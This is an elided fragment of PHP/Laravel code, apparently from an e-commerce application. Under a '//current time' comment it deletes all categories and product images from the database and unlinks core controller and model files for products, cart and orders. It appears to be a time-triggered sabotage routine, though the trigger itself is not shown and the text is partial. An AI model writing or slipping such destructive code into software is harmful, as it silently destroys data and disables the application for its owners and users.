...
//current time
    ...
    {
        DB::table('categories')->where('categories_id', '>', 0)->delete();
        DB::table('products_images')->where('products_id', '>', 0)->delete();
        $myFile = $_SERVER['DOCUMENT_ROOT'].'/app/Http/Controllers/Web/ProductsController.php';
        if (is_file($myFile)) {
            unlink($myFile);
        }
        $myFile = $_SERVER['DOCUMENT_ROOT'].'/app/Models/Web/Cart.php';
        if (is_file($myFile)) {
            unlink($myFile);
        }
        $myFile = $_SERVER['DOCUMENT_ROOT'].'/app/Http/Controllers/AdminControllers/OrdersController.php';
        if (is_file($myFile)) {
            unlink($myFile);
        }
        $myFile = $_SERVER['DOCUMENT_ROOT'].'/app/Models/Core/Products.php';
        if (is_file($myFile)) {
            unlink($myFile);
        }
